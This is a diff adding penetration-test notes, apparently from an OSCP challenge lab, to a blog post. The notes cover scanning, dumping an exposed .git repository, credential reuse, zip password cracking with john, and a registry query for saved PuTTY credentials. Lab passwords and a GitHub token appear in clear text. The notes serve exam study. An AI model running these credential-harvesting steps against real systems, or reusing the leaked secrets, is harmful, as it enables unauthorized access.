@@ -6,7 +6,7 @@ ShowToc: true
 TocOpen: true
 tags:
   - blog
-lastmod: 2026-01-09T08:26:51.342Z
+lastmod: 2026-01-14T17:30:02.408Z
 ---
 # Box Info
 
@@ -1538,3 +1538,610 @@ aero
 ![Pasted image 20260109161705.png](/ob/Pasted%20image%2020260109161705.png)
 
 next for this : https://hackmd.io/@roger102/S1Zc6uHzgg#144-%E2%80%93gt-prooftxt
+
+# 192.168.X.144
+
+192.168.136.144
+
+### \[\[PORT & IP SCAN]]
+
+```
+Not shown: 65517 closed tcp ports (reset)
+PORT      STATE    SERVICE       REASON
+21/tcp    open     ftp           syn-ack ttl 61
+22/tcp    open     ssh           syn-ack ttl 61
+80/tcp    open     http          syn-ack ttl 61
+2798/tcp  filtered tmesis-upshot no-response
+2916/tcp  filtered elvin_server  no-response
+6524/tcp  filtered unknown       no-response
+12242/tcp filtered unknown       no-response
+12307/tcp filtered unknown       no-response
+20141/tcp filtered unknown       no-response
+31977/tcp filtered unknown       no-response
+40561/tcp filtered unknown       no-response
+41472/tcp filtered unknown       no-response
+41552/tcp filtered unknown       no-response
+54453/tcp filtered unknown       no-response
+59164/tcp filtered unknown       no-response
+59521/tcp filtered unknown       no-response
+60819/tcp filtered unknown       no-response
+62417/tcp filtered unknown       no-response
+
+-------
+
+└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.144 -oN serviceScan.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 23:17 +0800
+Nmap scan report for 192.168.136.144
+Host is up (0.053s latency).
+
+PORT      STATE  SERVICE       VERSION
+21/tcp    open   ftp           vsftpd 3.0.5
+22/tcp    open   ssh           OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+|_  256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+80/tcp    open   http          Apache httpd 2.4.52 ((Ubuntu))
+|_http-generator: Nicepage 4.21.12, nicepage.com
+| http-git: 
+|   192.168.136.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Home
+2798/tcp  closed tmesis-upshot
+2916/tcp  closed elvin_server
+6524/tcp  closed unknown
+12242/tcp closed unknown
+12307/tcp closed unknown
+20141/tcp closed unknown
+31977/tcp closed unknown
+40561/tcp closed unknown
+41472/tcp closed unknown
+41552/tcp closed unknown
+54453/tcp closed unknown
+59164/tcp closed unknown
+59521/tcp closed unknown
+60819/tcp closed unknown
+62417/tcp closed unknown
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.50 seconds
+                                                                                                    
+```
+
+### \[\[FTP 21]] -- Scans
+
+```
+└─# ftp 192.168.136.144 
+Connected to 192.168.136.144.
+220 (vsFTPd 3.0.5)
+Name (192.168.136.144:root): stuart
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering Extended Passive Mode (|||13704|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000           33 Jan 14 14:00 local.txt
+226 Directory send OK.
+ftp> 
+
+```
+
+### \[\[SSH 22]] -- Scans
+
+```
+└─#  ssh stuart@192.168.136.144 
+The authenticity of host '192.168.136.144 (192.168.136.144)' can't be established.
+ED25519 key fingerprint is: SHA256:NQ0P6b7BgHDdEToc64di95hvEzS2pdZ7E02r4ZBkBYM
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.136.144' (ED25519) to the list of known hosts.
+stuart@192.168.136.144's password: 
+Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-53-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed Jan 14 03:32:39 PM UTC 2026
+
+  System load:  0.0                Processes:               203
+  Usage of /:   40.4% of 18.53GB   Users logged in:         0
+  Memory usage: 11%                IPv4 address for ens160: 192.168.136.144
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+0 updates can be applied immediately.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Oct 31 14:48:02 2022 from 192.168.118.5
+stuart@oscp:~$ 
+
+```
+
+### \[\[Unkown Port]] -- Scans
+
+> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
+
+```
+```
+
+***
+
+# Web Recon 80
+
+![Pasted image 20260114221737.png](/ob/Pasted%20image%2020260114221737.png)
+
+![Pasted image 20260114221855.png](/ob/Pasted%20image%2020260114221855.png)
+
+### \[\[git recon]]
+
+```
+─# uv pip install git-dumper 
+Using Python 3.13.11 environment at: haydon_env
+Resolved 15 packages in 816ms
+Prepared 7 packages in 3.05s
+Installed 12 packages in 52ms
+ + beautifulsoup4==4.14.3
+ + cffi==2.0.0
+ + charset-normalizer==3.4.4
+ + cryptography==46.0.3
+ + dulwich==0.25.2
+ + git-dumper==1.0.8
+ + pycparser==2.23
+ + pysocks==1.7.1
+ + requests==2.32.5
+ + requests-pkcs12==1.27
+ + soupsieve==2.8.1
+ + urllib3==2.6.3
+
+
+------------------------------------------------------------
+
+└─# uv run git-dumper http://192.168.136.144/.git/ .       
+[-] Testing http://192.168.136.144/.git/HEAD [200]
+[-] Testing http://192.168.136.144/.git/ [200]
+[-] Fetching .git recursively
+[-] Fetching http://192.168.136.144/.gitignore [404]
+[-] http://192.168.136.144/.gitignore responded with status code 404
+[-] Fetching http://192.168.136.144/.git/ [200]
+[-] Fetching http://192.168.136.144/.git/index [200]
+[-] Fetching http://192.168.136.144/.git/api/ [200]
+[-] Fetching http://192.168.136.144/.git/HEAD [200]
+Task .git/api/ raised exception:
+[-] Fetching http://192.168.136.144/.git/hooks/ [200]
+Traceback (most recent call last):
+[-] Fetching http://192.168.136.144/.git/README.md [200]
+[-] Fetching http://192.168.136.144/.git/branches/ [200]
+  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 155, in run
+    result = self.do_task(task, *self.args)
+  File "/root/Desktop/haydon_env/lib/python3.13/site-packages/git_dumper.py", line 302, in do_task
+    assert is_html(response)
+           ~~~~~~~^^^^^^^^^^
+AssertionError
+[-] Fetching http://192.168.136.144/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://192.168.136.144/.git/info/ [200]
+[-] Fetching http://192.168.136.144/.git/description [200]
+[-] Fetching http://192.168.136.144/.git/configuration/ [200]
+[-] Fetching http://192.168.136.144/.git/config [200]
+[-] Fetching http://192.168.136.144/.git/logs/ [200]
+[-] Fetching http://192.168.136.144/.git/packed-refs [200]
+[-] Fetching http://192.168.136.144/.git/objects/ [200]
+[-] Fetching http://192.168.136.144/.git/info/exclude [200]
+[-] Fetching http://192.168.136.144/.git/refs/ [200]
+[-] Fetching http://192.168.136.144/.git/robots.txt [200]
+[-] Fetching http://192.168.136.144/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/fsmonitor-watchman.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/post-update.sample [200]
+[-] Fetching http://192.168.136.144/.git/orders/ [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-commit.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-merge-commit.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-push.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-receive.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/pre-rebase.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/prepare-commit-msg.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/push-to-checkout.sample [200]
+[-] Fetching http://192.168.136.144/.git/hooks/update.sample [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/ [200]
+[-] Fetching http://192.168.136.144/.git/refs/remotes/ [200]
+[-] Fetching http://192.168.136.144/.git/refs/heads/ [200]
+[-] Fetching http://192.168.136.144/.git/configuration/database.php [200]
+[-] Fetching http://192.168.136.144/.git/refs/tags/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/44/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/8a/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/80/ [200]
+[-] Fetching http://192.168.136.144/.git/logs/HEAD [200]
+[-] Fetching http://192.168.136.144/.git/objects/93/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/info/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/8a/d08b041c8e2dfe72cc2ba90bcaed4d1088873f [200]
+[-] Fetching http://192.168.136.144/.git/objects/44/a055daf7a0cd777f28f444c0d29ddf3ff08c54 [200]
+[-] Fetching http://192.168.136.144/.git/orders/search.php [200]
+[-] Fetching http://192.168.136.144/.git/refs/heads/main [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/ [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/heads/ [200]
+[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/pack/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/80/9af487f5bb4b71659f897b793347ce62a3b5f4 [200]
+[-] Fetching http://192.168.136.144/.git/objects/93/290282d106a338e8d8a60e4297173c677aa73d [200]
+[-] Fetching http://192.168.136.144/.git/refs/remotes/origin/HEAD [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/heads/main [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/ [200]
+[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.idx [200]
+[-] Fetching http://192.168.136.144/.git/objects/pack/pack-6987e2dc8dbe6e430732c110b18c2c7ad9202c7f.pack [200]
+[-] Fetching http://192.168.136.144/.git/logs/refs/remotes/origin/HEAD [200]
+[-] Sanitizing .git/config
+[-] Running git checkout .
+Updated 7 paths from the index
+                                                         
+```
+
+### git abuse
+
+```
+git log
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:57:12 2022 +0200
+
+    Create database.php
+
+commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:56:19 2022 +0200
+
+    Delete database.php
+
+commit eda55ed6455d29532295684e3900cda74d695067
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:40 2022 +0200
+
+    Create robots.txt
+
+commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:08 2022 +0200
+
+    Create search.php
+
+commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:26:09 2022 +0200
+
+    Setting up database.php
+
+```
+
+![Pasted image 20260114232631.png](/ob/Pasted%20image%2020260114232631.png)
+
+> got the account stuart@challenge.lab : BreakingBad92
+
+```shell
+─#     git show 621a2e79b3a4a08bba12effe6331ff4513bad91a
+commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:57:12 2022 +0200
+
+    Create database.php
+
+diff --git a/configuration/database.php b/configuration/database.php
+new file mode 100644
+index 0000000..55b1645
+--- /dev/null
++++ b/configuration/database.php
+@@ -0,0 +1,19 @@
++<?php
++class Database{
++    private $host = "localhost";
++    private $db_name = "staff";
++    private $username = "stuart@challenge.lab";
++    private $password = "BreakingBad92";
++    public $conn;
++    public function getConnection() {
++        $this->conn = null;
++        try{
++            $this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
++            $this->conn->exec("set names utf8");
++        }catch(PDOException $exception){
++            echo "Connection error: " . $exception->getMessage();
++        }
++        return $this->conn;
++    }
++}
++?>
+
+```
+
+### stuart to chloe(backup file cred leak)
+
+![Pasted image 20260114234116.png](/ob/Pasted%20image%2020260114234116.png)
+
+```
+stuart@oscp:/opt/backup$ ls
+sitebackup1.zip  sitebackup2.zip  sitebackup3.zip
+stuart@oscp:/opt/backup$ 
+```
+
+```
+└─# scp -v stuart@192.168.136.144:/opt/backup/sitebackup*.zip ./
+Executing: program /usr/bin/ssh host 192.168.136.144, user stuart, command sftp
+debug1: OpenSSH_10.2p1 Debian-3, OpenSSL 3.5.4 30 Sep 2025
+```
+
+```
+──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
+└─# file sitebackup1.zip
+file sitebackup2.zip
+file sitebackup3.zip
+sitebackup1.zip: empty
+sitebackup2.zip: data
+sitebackup3.zip: Zip archive data, made by v6.3 UNIX, extract using at least v2.0, last modified Nov 17 2022 10:39:20, uncompressed size 0, method=store                   
+```
+
+```
+└─# zip2john sitebackup3.zip >hash3
+ver 2.0 sitebackup3.zip/joomla/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/administrator/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/api/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/cache/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/cli/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/components/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/images/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/includes/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/language/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/language/overrides/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/layouts/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/libs/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/media/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/modules/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/plugins/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/templates/ is not encrypted, or stored with non-handled compression type
+ver 2.0 sitebackup3.zip/joomla/tmp/ is not encrypted, or stored with non-handled compression type
+                                                                                                                                                                                                                                            
+┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
+└─# cat hash3 
+sitebackup3.zip/joomla/.DS_Store:$zip2$*0*1*0*17fc672f1505f7f7*6a80*446*f1bd10a274d16115fa4ca1725440b59c614b82d000b9656892c7bd10b5f4e33db059a55965df05fccde96e1da40d901d0dff75070b0d9cce76a0e63edab003bfc4ea81f3402de3bcdbdf35c3859510b945a27336b2bfe2a726f4bc58c745a58e14491ca2b84fe1b9a90738f3f560a8e4d876e97e29236f3205ecbae4af101cf8aa522e673cf7a2c25e5b9ad69c21a3d821542245c4794df889e0c8d10ec013f1b64007968f4e7638d1f8502c0092b5324322ba36979a4a60574230a9ede6289863d108971bce84225e04ebaf00fe85b4809ff6f8dc8c6f55fb854f8adabffe6e5707196356568b21cb6cfd3daae69cc293705aaf41aecb9a5d47f7b5556e07e12edf6838cbb8d2144e16024de1f867b06837ef40d45108a9cffbf9e797a31d56b35d86e28375329a6faa0e6f2716cbff58c3c717329a815e7d30328b749e6c995bb2b549b00f3cb4f4e01a53346db64da34e40e3a9bf4ce8bbcbe920f72a40a8b4542e96d635356be01980ece7f1cbdeda02392bdce4363dce2f3679387c52bec8afbaabee436c9ece27cf0992ee8edbe3849a3b7542bb8bafedaef873d8c8f2f039760ad04a044b678d8ff0936f742751dc6b7477d1b3b3b5dfa094cdbfb688cd8be50c031c15df708e5f7c5fc58b602d17f8412322e4a2083ae2e53d9753d59eb5791705417d49d850a1130ebbc85f66cc2ba2249cf9b741176d99a63f03fdb1df0e39d6f5911854bcb7715fff57623d973902d52532936de271c2c2319804a7b76753e68ef2a5f088e8fa90ed0d0ddbb0d607a328dbf44a715371a98d0e668b71c3476c1db89d8f4c85cf4104155487fd3c24ae7a95a0fb24a1d5d20935086872bceb3de44ae37c4fa857daeee36f0f7b5f7ebdb679d5652bbdcfa72c5bcd4143a503ca0017602476af5362e3ecf4da6e6103521141b0a860fd6427441ec2f86b57c1a20017d4f4794d21947e169a9c1806a0a201e0f598f7bd05ccc3b5e51d68760bfc41b1edce23f79f29d9200cd0ec9ae917292451f04399691cefef6e6464dd7adcb2e06a1fc81f643ce809264147dca4c3feba46b29a02a677c4b303367f216febd7b1e592fb00dbbc9c0251da34479361c29aecc7c2b01c9a84c39fd9f4887406a33087fc2bcdf6af5cd8ec6f843f2bf96970b117e823187021d3aba71b05b25b01da2e42c52d38180c34e3a5f21a59aa92bf4e98f3a1e0abbf94520203e6daa411e1076dd0d8253b42b9936ee35b87d8fa76a3ed7c1fda7801ff9b6ec8bdb532a6fb0bc659201a631551ee5faa4d8f636a02dd4e77805ed87447d2707381bff4df09eeeca873ff2d798b50a1d39873c5de6b9c9cce0d06b262c4094b47a96fefabd22c90504d14245b46d7f8a4ca32f73bd5c08ba5bf0bca712137b816a45dbe21b6533e0c53ff65c44a61d88be8bf0f688ff4c3423f96c4b55f888967a71fc70b85beaa2ee3e2a03e6bb6ccbd31e53dd3054ab1c24dc72cfa4d6550c7861e0797eedca1016ba
+```
+
+```
+# john --wordlist=/usr/share/wordlists/rockyou.txt  hash3 
+Using default input encoding: UTF-8
+Loaded 19 password hashes with 19 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
+Loaded hashes with cost 1 (HMAC size) varying from 28 to 6535
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:02 0.14% (ETA: 00:47:23) 0g/s 0p/s 178951c/s 178951C/s 123456..280789
+codeblue         (sitebackup3.zip/joomla/language/.DS_Store)     
+codeblue         (sitebackup3.zip/joomla/includes/app.php)     
+codeblue         (sitebackup3.zip/joomla/web.config.txt)     
+codeblue         (sitebackup3.zip/joomla/cli/joomla.php)     
+codeblue         (sitebackup3.zip/joomla/cli/index.html)     
+codeblue         (sitebackup3.zip/joomla/htaccess.txt)     
+codeblue         (sitebackup3.zip/joomla/LICENSE.txt)     
+codeblue         (sitebackup3.zip/joomla/includes/index.html)     
+codeblue         (sitebackup3.zip/joomla/language/overrides/index.html)     
+codeblue         (sitebackup3.zip/joomla/cache/index.html)     
+codeblue         (sitebackup3.zip/joomla/includes/defines.php)     
+codeblue         (sitebackup3.zip/joomla/README.txt)     
+codeblue         (sitebackup3.zip/joomla/language/index.html)     
+codeblue         (sitebackup3.zip/joomla/.DS_Store)     
+codeblue         (sitebackup3.zip/joomla/includes/framework.php)     
+codeblue         (sitebackup3.zip/joomla/index.php)     
+codeblue         (sitebackup3.zip/joomla/configuration.php)     
+codeblue         (sitebackup3.zip/joomla/robots.txt)     
+codeblue         (sitebackup3.zip/joomla/tmp/index.html)     
+19g 0:00:00:05 DONE (2026-01-15 00:24) 3.578g/s 9256p/s 175873c/s 175873C/s 280690..trudy
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+```
+sudo apt install p7zip-full
+Ign:1 http://security.kali.org/kali-security kali/updates InRelease
+0% [Connecting to http.kali.org (54.39.128.230)] [Connecting to dl.google.com] [Connecting to download.sublimetext.
+Get:2 https://dl.google.com/linux/chrome/deb stable InRelease [1,825 B]                                            
+Get:3 https://dl.google.com/linux/chrome/deb stable/main amd64 Packages [1,214 B]                                  
+Get:4 http://mirror.twds.com.tw/kali kali-rolling InRelease [34.0 kB]                                             
+Get:5 https://download.sublimetext.com apt/stable/ InRelease [3,320 B]
+Get:6 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Packages [20.9 MB]
+Ign:1 http://security.kali.org/kali-security kali/updates InRelease
+Ign:1 http://security.kali.org/kali-security kali/updates InRelease
+Get:7 http://mirror.twds.com.tw/kali kali-rolling/main amd64 Contents (deb) [52.5 MB]
+Err:1 http://security.kali.org/kali-security kali/updates InRelease                                                
+  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
+Get:8 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Packages [190 kB]                                 
+Get:9 http://mirror.twds.com.tw/kali kali-rolling/non-free amd64 Contents (deb) [905 kB]                           
+Get:10 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Packages [115 kB]                                 
+Get:11 http://mirror.twds.com.tw/kali kali-rolling/contrib amd64 Contents (deb) [254 kB]                           
+Fetched 74.8 MB in 11s (6,508 kB/s)                                                                                
+367 packages can be upgraded. Run 'apt list --upgradable' to see them.
+Warning: Failed to fetch http://security.kali.org/kali-security/dists/kali/updates/InRelease  Something wicked happened resolving 'security.kali.org:http' (-5 - No address associated with hostname)
+Warning: Some index files failed to download. They have been ignored, or old ones used instead.
+Note, selecting '7zip' instead of 'p7zip-full'
+7zip is already the newest version (25.01+dfsg-5).
+7zip set to manually installed.
+Summary:                    
+  Upgrading: 0, Installing: 0, Removing: 0, Not Upgrading: 367
+                                                                                                                    
+┌──(haydon_env)─(root㉿kali)-[~/Desktop/oscpa]
+└─# 7z x sitebackup3.zip
+
+7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
+ 64-bit locale=en_HK.UTF-8 Threads:128 OPEN_MAX:1024, ASM
+
+Scanning the drive for archives:
+1 file, 25312 bytes (25 KiB)
+
+Extracting archive: sitebackup3.zip
+--
+Path = sitebackup3.zip
+Type = zip
+Physical Size = 25312
+
+    
+Enter password (will not be echoed):
+Everything is Ok
+
+Folders: 17
+Files: 19
+Size:       67063
+Compressed: 25312
+
+```
+
+```
+ls /joomla/configuration.php
+```
+
+![Pasted image 20260115004012.png](/ob/Pasted%20image%2020260115004012.png)
+
+```
+stuart@oscp:/opt/backup$ su chloe
+Password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+chloe@oscp:/opt/backup$ su root
+
+```
+
+### chloe to root
+
+![Pasted image 20260115004217.png](/ob/Pasted%20image%2020260115004217.png)
+
+![Pasted image 20260115004340.png](/ob/Pasted%20image%2020260115004340.png)
+
+***
+
+# Recon 192.168.x.143
+
+### \[\[PORT & IP SCAN]]
+
+```
+└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.136.145 -oN serviceScan.txt
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-15 00:48 +0800
+Stats: 0:02:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 85.71% done; ETC: 00:51 (0:00:25 remaining)
+Nmap scan report for 192.168.136.145
+Host is up (0.049s latency).
+
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: Samuel's Personal Site
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1978/tcp open  unisql?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    system windows 6.2
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=oscp
+| Not valid before: 2025-09-18T02:02:28
+|_Not valid after:  2026-03-20T02:02:28
+| rdp-ntlm-info: 
+|   Target_Name: OSCP
+|   NetBIOS_Domain_Name: OSCP
+|   NetBIOS_Computer_Name: OSCP
+|   DNS_Domain_Name: oscp
+|   DNS_Computer_Name: oscp
+|   Product_Version: 10.0.19041
+|_  System_Time: 2026-01-14T16:51:20+00:00
+|_ssl-date: 2026-01-14T16:52:00+00:00; 0s from scanner time.
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1978-TCP:V=7.98%I=7%D=1/15%Time=6967C8F0%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,14,"system\x20windows\x206\.2\n\n")%r(GenericLines,14,"system\x20win
+SF:dows\x206\.2\n\n")%r(GetRequest,14,"system\x20windows\x206\.2\n\n")%r(H
+SF:TTPOptions,14,"system\x20windows\x206\.2\n\n")%r(RTSPRequest,14,"system
+SF:\x20windows\x206\.2\n\n")%r(RPCCheck,14,"system\x20windows\x206\.2\n\n"
+SF:)%r(DNSVersionBindReqTCP,14,"system\x20windows\x206\.2\n\n")%r(DNSStatu
+SF:sRequestTCP,14,"system\x20windows\x206\.2\n\n")%r(Help,14,"system\x20wi
+SF:ndows\x206\.2\n\n")%r(SSLSessionReq,14,"system\x20windows\x206\.2\n\n")
+SF:%r(TerminalServerCookie,14,"system\x20windows\x206\.2\n\n")%r(TLSSessio
+SF:nReq,14,"system\x20windows\x206\.2\n\n")%r(Kerberos,14,"system\x20windo
+SF:ws\x206\.2\n\n")%r(SMBProgNeg,14,"system\x20windows\x206\.2\n\n")%r(X11
+SF:Probe,14,"system\x20windows\x206\.2\n\n")%r(FourOhFourRequest,14,"syste
+SF:m\x20windows\x206\.2\n\n")%r(LPDString,14,"system\x20windows\x206\.2\n\
+SF:n")%r(LDAPSearchReq,14,"system\x20windows\x206\.2\n\n")%r(LDAPBindReq,1
+SF:4,"system\x20windows\x206\.2\n\n")%r(SIPOptions,14,"system\x20windows\x
+SF:206\.2\n\n")%r(LANDesk-RC,14,"system\x20windows\x206\.2\n\n")%r(Termina
+SF:lServer,14,"system\x20windows\x206\.2\n\n")%r(NCP,14,"system\x20windows
+SF:\x206\.2\n\n")%r(NotesRPC,14,"system\x20windows\x206\.2\n\n")%r(JavaRMI
+SF:,14,"system\x20windows\x206\.2\n\n")%r(WMSRequest,14,"system\x20windows
+SF:\x206\.2\n\n")%r(oracle-tns,14,"system\x20windows\x206\.2\n\n")%r(ms-sq
+SF:l-s,14,"system\x20windows\x206\.2\n\n")%r(afp,14,"system\x20windows\x20
+SF:6\.2\n\n")%r(giop,14,"system\x20windows\x206\.2\n\n");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-01-14T16:51:22
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 200.06 seconds
+
+```
+
+### \[\[Unkown Port]] -- Scans  1978
+
+> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。
+
+```
+```
+
+![Pasted image 20260115005747.png](/ob/Pasted%20image%2020260115005747.png)
+
+![Pasted image 20260115010216.png](/ob/Pasted%20image%2020260115010216.png)
+
+![Pasted image 20260115012444.png](/ob/Pasted%20image%2020260115012444.png)
+
+### offsec to admin (Registry Cred leak)
+
+https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.002/T1552.002.md
+
+![Pasted image 20260115012619.png](/ob/Pasted%20image%2020260115012619.png)
+
+```
+reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+```
+
+![Pasted image 20260115012704.png](/ob/Pasted%20image%2020260115012704.png)\
+zachary:h3R@tC@tch3r
+
+![Pasted image 20260115013001.png](/ob/Pasted%20image%2020260115013001.png)
+
+***
